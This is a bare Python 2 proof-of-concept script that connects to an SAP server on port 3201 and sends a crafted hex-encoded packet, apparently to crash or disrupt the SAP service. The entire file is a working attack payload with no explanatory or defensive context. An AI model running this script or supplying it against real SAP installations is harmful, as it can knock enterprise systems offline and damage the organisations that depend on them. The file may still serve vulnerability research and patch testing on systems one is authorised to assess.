import socket
PoC = "00000058abcde123000000000000005800000058060100000000000600000000000003e800000001000003e800000003707973617027732d6d6f6e69746f72000000e0b98000020000003b0000000500000003000000060000000400000001"
 
for i in range(1):
    try:
        sock = socket.socket()
        sock.connect((SAP_SERVER, 3201))
        sock.send(PoC.decode("hex"))
        data = sock.recv(1024)
        sock.close()
    except Exception, ex:
        ex.message
